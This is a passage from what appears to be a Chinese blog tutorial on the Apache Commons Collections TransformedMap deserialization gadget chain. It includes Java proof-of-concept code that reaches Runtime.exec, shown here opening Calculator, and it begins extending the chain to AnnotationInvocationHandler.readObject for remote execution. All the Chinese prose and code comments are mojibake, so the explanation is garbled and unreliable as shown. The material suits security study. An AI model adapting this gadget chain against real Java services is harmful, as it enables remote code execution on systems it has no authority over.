class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvalObject_1</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//ä¼ å…¥Runtimeç±»</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//åå°„è°ƒç”¨getMethodæ–¹æ³•,ç„¶ågetMethodæ–¹æ³•å†åå°„è°ƒç”¨getRuntimeæ–¹æ³•, è¿”å›Runtime.getRuntime()æ–¹æ³•</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//åå°„è°ƒç”¨invokeæ–¹æ³•ï¼Œç„¶ååå°„æ‰§è¡ŒRuntime.getRuntime()æ–¹æ³•ï¼Œè¿”å›Runtimeå®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//åå°„è°ƒç”¨execæ–¹æ³•</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open /System/Applications/Calculator.app &quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        transformerChain.transform(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>è¯¦ç»†åˆ†æ</strong></p>
<p>â€‹    è¿™ä¸ªåœ°æ–¹å¯èƒ½è¦æ³¨æ„ï¼Œç¬¬ä¸€ä¸ªInvokerTransformeråå°„è°ƒç”¨çš„æ˜¯getMethodæ–¹æ³•ï¼Œè€Œä¸æ˜¯getRuntimeæ–¹æ³•, æ˜¯é€šè¿‡åå°„è°ƒç”¨çš„getMethodæ–¹æ³•ï¼Œå†æ¬¡åå°„è°ƒç”¨getRuntimeæ–¹æ³•ï¼Œæ‰è¿”å›çš„Runtime.getRuntime( )æ–¹æ³•ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-162607.png"
                      alt="image-20230419002607571"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-163526.png"
                      alt="image-20230419003526227"
                ></p>
<p>â€‹    æ­¤æ—¶å¯ä»¥çœ‹è§ä¼ å…¥çš„æ˜¯java.lang.Runtime</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-163712.png"
                      alt="image-20230419003712051"
                ></p>
<p>â€‹    è¿›å…¥transform</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-164749.png"
                      alt="image-20230419004748540"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-164913.png"
                      alt="image-20230419004912612"
                ></p>
<p>â€‹    æˆ‘ä»¬çœ‹åˆ°è·å–åˆ°çš„å®é™…æ˜¯</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-165309.png"
                      alt="image-20230419005308562"
                ></p>
<p>â€‹    é‚£ä¹ˆè¿™å¥è¿”å›çš„å…¶å®æ˜¯<strong>java.lang.reflect.Methodçš„å¯¹è±¡.invoke( java.lang.Runtime , getRuntime)</strong></p>
<p>â€‹    è¿™å„¿è¿”å›çš„æ˜¯Java.lang.Runtime.getRuntime( )äº†</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-171910.png"
                      alt="image-20230419011909432"
                ></p>
<h2 id="Transform-æ–¹æ³•çš„åˆ©ç”¨æ¡ä»¶"><a href="#Transform-æ–¹æ³•çš„åˆ©ç”¨æ¡ä»¶" class="headerlink" title="Transform()æ–¹æ³•çš„åˆ©ç”¨æ¡ä»¶"></a>Transform()æ–¹æ³•çš„åˆ©ç”¨æ¡ä»¶</h2><p>â€‹    ä¸Šä¸€æ­¥ , æˆ‘ä»¬é€šè¿‡ java åå°„æœºåˆ¶æ¶ˆé™¤äº† <strong>transform()</strong> æ–¹æ³•çš„å‚æ•°é™åˆ¶ . ä½†æ˜¯ä¾æ—§éœ€è¦æ‰‹åŠ¨è§¦å‘ <strong>transform()</strong> æ–¹æ³• , è¿™æ ·çš„åœºæ™¯æ˜¯æ¯”è¾ƒå°‘çš„ .</p>
<p>â€‹    æ ¹æ® Java ååºåˆ—åŒ–æ¼æ´çš„å®šä¹‰ , æˆ‘ä»¬æ›´åŠ æœŸæœ›åç«¯ç¨‹åºåœ¨æ‰§è¡Œ <strong>readObject()</strong> æ–¹æ³•æ—¶å°±ä¼šè‡ªåŠ¨æ‰§è¡Œ <strong>transform() æ–¹æ³•</strong>.</p>
<p>â€‹    ç»¼ä¸Šæ‰€è¿° , ä¸ºäº†å®ç°å®Œæ•´çš„åˆ©ç”¨é“¾ , å¿…é¡»è¦è¾¾æˆå¦‚ä¸‹ä¸¤ä¸ªç›®æ ‡ :</p>
<ul>
<li>æ‰¾åˆ°ä¸€ä¸ª tansform() æ–¹æ³• , è¯¥æ–¹æ³•æ‰€å±çš„å®ä¾‹å¯¹è±¡æ˜¯å¯æ§çš„.</li>
<li>æ‰¾åˆ°ä¸€ä¸ªé‡å†™çš„ readObject() æ–¹æ³• , è¯¥æ–¹æ³•ä¼šè‡ªåŠ¨è°ƒç”¨ transform() æ–¹æ³•.</li>
</ul>
<p>â€‹    è¿™ä¸ªé™åˆ¶æ˜¯éå¸¸ä¸¥è°¨çš„ , ç›®å‰ç ”ç©¶äººå‘˜å…±å‘æ˜å‡ºäº†ä¸¤æ¡æ”»å‡»é“¾ , ä¹Ÿå°±æ˜¯ç»å…¸çš„ <strong>TransformedMapæ”»å‡»é“¾</strong> å’Œ <strong>LazyMapæ”»å‡»é“¾</strong></p>
<h2 id="TransformedMapæ”»å‡»é“¾"><a href="#TransformedMapæ”»å‡»é“¾" class="headerlink" title="TransformedMapæ”»å‡»é“¾"></a>TransformedMapæ”»å‡»é“¾</h2><p>â€‹    Apache Commons Collections å®ç°äº†ä¸€ä¸ª TransformedMap ç±»ï¼Œè¯¥ç±»æ˜¯å¯¹ Java æ ‡å‡†æ•°æ®ç»“æ„ Map æ¥å£çš„ä¸€ä¸ªæ‰©å±• .</p>
<p>â€‹    è¯¥ç±»å¯ä»¥åœ¨ä¸€ä¸ªå…ƒç´ è¢«åŠ å…¥åˆ°é›†åˆå†…æ—¶ï¼Œè‡ªåŠ¨å¯¹è¯¥å…ƒç´ è¿›è¡Œç‰¹å®šçš„ä¿®é¥°å˜æ¢ , å…·ä½“çš„å˜æ¢é€»è¾‘ç”±Transformer ç±»å®šä¹‰ï¼ŒTransformer åœ¨ TransformedMap å®ä¾‹åŒ–æ—¶ä½œä¸ºå‚æ•°ä¼ å…¥.</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-19-022917.png"
                      alt="image-20230419102917243"
                ></p>
<h3 id="TransformedMap-checkSetValue"><a href="#TransformedMap-checkSetValue" class="headerlink" title="TransformedMap.checkSetValue()"></a><strong>TransformedMap.checkSetValue()</strong></h3><p>â€‹    <strong>TransformedMap</strong> ç±»çš„ <strong>checkSetValue()</strong> æ–¹æ³•ä¸­è°ƒç”¨äº† <strong>Transform()</strong> æ–¹æ³• .</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-19-023534.png"
                      alt="image-20230419103533746"
                ></p>
<p>â€‹    åªè¦æˆ‘ä»¬èƒ½æ§åˆ¶ <strong>this.valueTransformer</strong> , é‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨è¯¥æ–¹æ³•æ‰§è¡Œ <strong>ChainedTransformer.transform()</strong> æ–¹æ³• , è¿›å…¥æ„é€ å¥½çš„å‡½æ•°è°ƒç”¨é“¾ . æ ¹æ®ä¸Šæ–‡å¯ä»¥å¾—çŸ¥ , <strong>this.valueTransformer</strong> ä¼šåœ¨ <strong>TransformedMap</strong> ç±»è¢«å®ä¾‹åŒ–æ—¶è¢«ä¼ å…¥ .</p>
<p>â€‹    ç”±äº <strong>TransformedMap</strong> ç±»çš„æ„é€ æ–¹æ³•é€šè¿‡ <strong>protected</strong> ä¿®é¥°ç¬¦ä¿®é¥° , æ‰€ä»¥æ— æ³•åœ¨å¤–ç•Œè·å¾— <strong>TransformedMap</strong> å®ä¾‹å¯¹è±¡ . å¯¹æ­¤ , è¯¥ç±»æä¾›äº† <strong>decorate()</strong> æ–¹æ³•æ¥è¿”å› <strong>TransformedMap</strong> å®ä¾‹å¯¹è±¡ , è€Œ <strong>decorate()</strong> æ–¹æ³•é€šè¿‡ <strong>public</strong> ä¿®é¥°ç¬¦ä¿®é¥° , å¤–ç•Œå¯ä»¥ç›´æ¥è°ƒç”¨ .</p>
<p>â€‹    ç»¼ä¸Šæ‰€è¿° , <strong>this.valueTransformer</strong> æ˜¯å®Œå…¨å¯æ§çš„ . æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™é‡Œè°ƒç”¨ <strong>ChainedTransformer.transform()</strong> æ–¹æ³•</p>
<h3 id="TransformedMap-decorate"><a href="#TransformedMap-decorate" class="headerlink" title="TransformedMap.decorate()"></a><strong>TransformedMap.decorate()</strong></h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-19-025851.png"
                      alt="image-20230419105850687"
                ></p>
<p>â€‹    Map : éœ€è¦è½¬æ¢çš„ Map å¯¹è±¡</p>
<p>â€‹    KeyTransformer : ç”¨äºè½¬æ¢é”®çš„è½¬æ¢å™¨ , å¦‚æœä¸º null åˆ™è¡¨ç¤ºä¸è¿›è¡Œè½¬æ¢</p>
<p>â€‹    ValueTransformer : ç”¨äºè½¬æ¢å€¼çš„è½¬æ¢å™¨ , å¦‚æœä¸º null åˆ™è¡¨ç¤ºä¸è¿›è¡Œè½¬æ¢</p>
<p>â€‹    <strong>æ—¢ç„¶è¦è°ƒç”¨ TransformedMap.decorate() æ–¹æ³• , é‚£ä¹ˆè¿™é‡Œ ValueTransformer å°±åº”ä¸º ChainedTransformer . æ­¤å¤– , æˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ª Mapç±»å‹çš„å˜é‡ , è€Œè·å– Map æœ€ç®€å•çš„æ–¹å¼å°±æ˜¯æ„é€ ä¸€ä¸ª HashMap , ç„¶åå°†è¯¥ Map å®ä¾‹å¯¹è±¡ä¼ å…¥ decorate() æ–¹æ³•ä¸­.</strong></p>
<p>â€‹    å› æ­¤ , æˆ‘ä»¬éœ€è¦æ„é€ å¦‚ä¸‹ä»£ç  :</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åˆ›å»ºMapå¹¶ç»‘å®štransformerChain</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//åˆå§‹åŒ–HashMap</span></span><br><span class="line">innerMap.put(<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">//è°ƒç”¨decorate()æ–¹æ³•</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap,<span class="literal">null</span>,transformerChain);</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-19-030428.png"
                      alt="image-20230419110427673"
                ></p>
<p>â€‹    é‚£ä¹ˆç°åœ¨è¿˜å‰©ä¸€ä¸ªé—®é¢˜ : å¦‚ä½•è°ƒç”¨ checkSetValue() æ–¹æ³•å‘¢? è¦çŸ¥é“è¯¥æ–¹æ³•åŒæ ·é€šè¿‡ protected ä¿®é¥°ç¬¦ä¿®é¥° , å¤–ç•Œæ˜¯æ— æ³•ç›´æ¥è°ƒç”¨çš„ .</p>
<h3 id="AbstractInputCheckedMapDecorator-MapEntry-setValue"><a href="#AbstractInputCheckedMapDecorator-MapEntry-setValue" class="headerlink" title="AbstractInputCheckedMapDecorator$MapEntry.setValue()"></a><strong>AbstractInputCheckedMapDecorator$MapEntry.setValue()</strong></h3><p>â€‹    transformedMap çš„çˆ¶ç±» AbstractInputCheckedMapDecorator ä¸­å­˜åœ¨ä¸€ä¸ªé™æ€å†…éƒ¨ç±» MapEntry , è¯¥ç±» setValue() ä¸­è°ƒç”¨äº† checkSetValue() æ–¹æ³•.    <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-19-145957.png"
                      alt="image-20230419225956866"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-19-150109.png"
                      alt="image-20230419230108770"
                ></p>
<p>â€‹    æˆ‘ä»¬ç°åœ¨çš„ç›®æ ‡æ˜¯è°ƒç”¨ <strong>TransformedMap.checkSetValue()</strong> æ–¹æ³• , å› æ­¤åªéœ€è¦ä»¤ <strong>this.parent</strong> æŒ‡å‘ <strong>TransformedMap</strong> å®ä¾‹å¯¹è±¡å³å¯ . æŸ¥çœ‹ <strong>MapEntry</strong> å†…éƒ¨ç±»çš„æ„é€ å‡½æ•° , å¯ä»¥ç¡®å®š <strong>this.parent</strong> å‚æ•°å€¼æ˜¯ä½œä¸ºå‚æ•°ä¼ å…¥çš„ . æ˜¯å¯æ§çš„ .</p>
<h3 id="AbstractInputCheckedMapDecorator-EntrySetIterator-next"><a href="#AbstractInputCheckedMapDecorator-EntrySetIterator-next" class="headerlink" title="AbstractInputCheckedMapDecorator$EntrySetIterator.next()"></a><strong>AbstractInputCheckedMapDecorator$EntrySetIterator.next()</strong></h3><p>â€‹    æˆ‘ä»¬å¯¹ <strong>this.parent = parent</strong> æ‰“æ–­ç‚¹ , æŸ¥çœ‹ <strong>parent</strong> å‚æ•°å€¼çš„å‡½æ•°è°ƒç”¨æ ˆ .</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-19-151421.png"
                      alt="image-20230419231420887"
                ></p>
<p>â€‹    å¯ä»¥çœ‹åˆ° , <strong>AbstractInputCheckedMapDecorator</strong> ç±»çš„é™æ€å†…éƒ¨ç±» <strong>EntrySetIterator</strong> ä¸­çš„ <strong>next()</strong> æ–¹æ³•è§¦å‘äº† <strong>MapEntry</strong> å†…éƒ¨ç±»çš„æ„é€ å‡½æ•° , å¹¶ä¼ å…¥ <strong>parent</strong> å‚æ•°å€¼ . æœ€åè¿”å› <strong>AbstractInputCheckedMapDecorator$MapEntry</strong> å®ä¾‹å¯¹è±¡ .</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-19-152428.png"
                      alt="image-20230419232428220"
                ></p>
<h3 id="AbstractInputCheckedMapDecorator-EntrySet-iterator"><a href="#AbstractInputCheckedMapDecorator-EntrySet-iterator" class="headerlink" title="AbstractInputCheckedMapDecorator$EntrySet.iterator()"></a><strong>AbstractInputCheckedMapDecorator$EntrySet.iterator()</strong></h3><p>â€‹    è¿™é‡Œ <strong>this.parent</strong> å‚æ•°ä¾æ—§æ˜¯å¯æ§çš„ ,æˆ‘ä»¬ç»§ç»­è·Ÿè¸ª <strong>this.parent = parent</strong> ,</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-19-153005.png"
                      alt="image-20230419233004835"
                ></p>
<p>â€‹    å¯ä»¥çœ‹åˆ° , <strong>AbstractInputCheckedMapDecorator</strong> ç±»çš„é™æ€å†…éƒ¨ç±» <strong>EntrySet</strong> ä¸­çš„ <strong>iterator()</strong> æ–¹æ³•è§¦å‘äº† <strong>EntrySetIterator</strong> å†…éƒ¨ç±»çš„æ„é€ å‡½æ•° , å¹¶ä¸”ä¼ å…¥ <strong>parent</strong> å‚æ•°. æœ€åè¿”å› <strong>AbstractInputCheckedMapDecorator$EntrySetIterator</strong> å®ä¾‹å¯¹è±¡.</p>
<h3 id="AbstractInputCheckedMapDecorator-entrySet"><a href="#AbstractInputCheckedMapDecorator-entrySet" class="headerlink" title="AbstractInputCheckedMapDecorator.entrySet()"></a><strong>AbstractInputCheckedMapDecorator.entrySet()</strong></h3><p>â€‹    ä¾æ—§æ²¡çœ‹åˆ° <strong>this.parent</strong> çš„æ§åˆ¶ç‚¹ , æˆ‘ä»¬ç»§ç»­è¿½è¸ª <strong>this.parent = parent</strong> .</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-19-153449.png"
                      alt="image-20230419233448685"
                ></p>
<p>â€‹    è¿™é‡Œä¼šæ ¹æ® <strong>isSetValueChecking()</strong> æ–¹æ³•çš„è¿”å›å€¼å†³å®šæ˜¯å¦è°ƒç”¨ <strong>AbstractInputCheckedMapDecorator.EntrySet()</strong> æ–¹æ³• .</p>
<p>â€‹    è€ŒæŠ½è±¡ç±» <strong>AbstractInputCheckedMapDecorator</strong> æ°å¥½æ˜¯ <strong>TransformedMap</strong> çš„çˆ¶ç±» , å› æ­¤è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°† <strong>this</strong> æŒ‡å‘ <strong>TransformedMap</strong> . ä½¿å¾—æœ€åè°ƒç”¨ <strong>TransformedMap.checkSetValue()</strong> æ–¹æ³• .</p>
<h3 id="TransformedMap-isSetValueChecking"><a href="#TransformedMap-isSetValueChecking" class="headerlink" title="TransformedMap.isSetValueChecking()"></a><strong>TransformedMap.isSetValueChecking()</strong></h3><p>â€‹    é‚£ä¹ˆç°åœ¨è¿˜å‰©æœ€åä¸€ä¸ªé—®é¢˜ : æˆ‘ä»¬éœ€è¦è®© isSetValueChecking() æ–¹æ³•çš„è¿”å›å€¼ä¸º True</p>
<p>â€‹    <strong>TransformedMap</strong> å®ç°äº†æŠ½è±¡çˆ¶ç±»çš„ <strong>isSetValueChecking( )</strong> æ–¹æ³• , æ¥çœ‹ä¸€ä¸‹å‡½æ•°å®šä¹‰</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-19-154522.png"
                      alt="image-20230419234522353"
                ></p>
<p>â€‹    åªéœ€è¦è®© <strong>this.valueTransformer</strong> ä¸ä¼šç©ºå³å¯ ! è¿™å½“ç„¶æ˜¯æˆç«‹çš„ , æˆ‘ä»¬åœ¨å°† <strong>TransfromedMap.decorate()</strong> æ–¹æ³•æ—¶å·²ç»å°† ChainedTransformer èµ‹å€¼ç»™äº† <strong>this.valueTransformer</strong></p>
<h2 id="æœ¬åœ°å‘½ä»¤æ‰§è¡ŒPOC"><a href="#æœ¬åœ°å‘½ä»¤æ‰§è¡ŒPOC" class="headerlink" title="æœ¬åœ°å‘½ä»¤æ‰§è¡ŒPOC"></a>æœ¬åœ°å‘½ä»¤æ‰§è¡ŒPOC</h2><p>â€‹    æˆ‘ä»¬ä¸Šé¢æ‰€æœ‰æåˆ°çš„æ–¹æ³•è°ƒç”¨æ„æˆäº†ä¸€ä¸ªé—­ç¯ , æˆ‘ä»¬åªéœ€è¦è·å– <strong>AbstractInputCheckedMapDecorator$MapEntry</strong> å®ä¾‹å¯¹è±¡å¹¶æ‰‹åŠ¨è§¦å‘ setValue() æ–¹æ³• , å°±å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç  .</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvalObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//ä¼ å…¥Runtimeç±»</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//åå°„è°ƒç”¨getMethodæ–¹æ³•,ç„¶ågetMethodæ–¹æ³•å†åå°„è°ƒç”¨getRuntimeæ–¹æ³•, è¿”å›Runtime.getRuntime()æ–¹æ³•</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//åå°„è°ƒç”¨invokeæ–¹æ³•ï¼Œç„¶ååå°„æ‰§è¡ŒRuntime.getRuntime()æ–¹æ³•ï¼Œè¿”å›Runtimeå®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//åå°„è°ƒç”¨execæ–¹æ³•</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open /System/Applications/Calculator.app &quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å°†transformersæ•°ç»„å­˜å…¥ChaniedTransformerè¿™ä¸ªç»§æ‰¿ç±»</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åˆ›å»ºMapå¹¶ç»‘å®štransformerChain</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è§¦å‘æ¼æ´</span></span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">onlyElement</span> <span class="operator">=</span> (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        onlyElement.setValue(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç”¨åˆ°ä¸€äº›é€†æ¨çš„æ€æƒ³ , è¯´æ˜äº†å‡½æ•°è°ƒç”¨é“¾æ˜¯å¦‚ä½•æ„é€ çš„ . è‡³æ­¤ ,  POC å°±æ„é€ å®Œæ¯•äº† .</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-19-160047.png"
                      alt="image-20230420000047488"
                ></p>
<h2 id="å»¶é•¿æ”»å‡»é“¾"><a href="#å»¶é•¿æ”»å‡»é“¾" class="headerlink" title="å»¶é•¿æ”»å‡»é“¾"></a>å»¶é•¿æ”»å‡»é“¾</h2><h3 id="annotation-AnnotationInvocationHandler-readObject"><a href="#annotation-AnnotationInvocationHandler-readObject" class="headerlink" title="annotation/AnnotationInvocationHandler.readObject()"></a><strong>annotation/AnnotationInvocationHandler.readObject()</strong></h3><p>â€‹    è¿™ä¸ª POC æ˜¯ä¸å®Œå–„çš„ï¼Œå› ä¸ºè¿™ä¸ª POC å‹æ ¹æ²¡æ³•æŠ•å…¥ä½¿ç”¨ ! æˆ‘ä»¬æœ€ç»ˆçš„ç›®æ ‡æ˜¯è®©ä¸Šæ–‡æ„é€ çš„æ¶æ„ç±»åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šæ‰§è¡Œ , ä¹Ÿå°±æ˜¯è®©æ¶æ„ç±»ç»è¿‡åºåˆ—åŒ–/ååºåˆ—åŒ–åç›´æ¥æ‰§è¡Œ .</p>
<p>â€‹    æˆ‘ä»¬çš„ç›®æ ‡æ˜¯æ‰¾åˆ°ä¸€ä¸ªé‡å†™ readObject() æ–¹æ³•çš„åœ°æ–¹ . è¯¥æ–¹æ³•ä¸­ä¼šè°ƒç”¨å¯æ§çš„ setValue() æ–¹æ³• . é‚£ä¹ˆæ˜¯å¦å­˜åœ¨è¿™æ ·çš„åœ°æ–¹å‘¢ ? åœ¨ Jdk1.7 ä¸­ , <strong>annotation/AnnotationInvocationHandler</strong> ç±»çš„ <strong>readObject()</strong> æ–¹æ³•å®ç°äº†æˆ‘ä»¬çš„éœ€æ±‚ .</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-19-161933.png"
                      alt="image-20230420001932581"
                ></p>
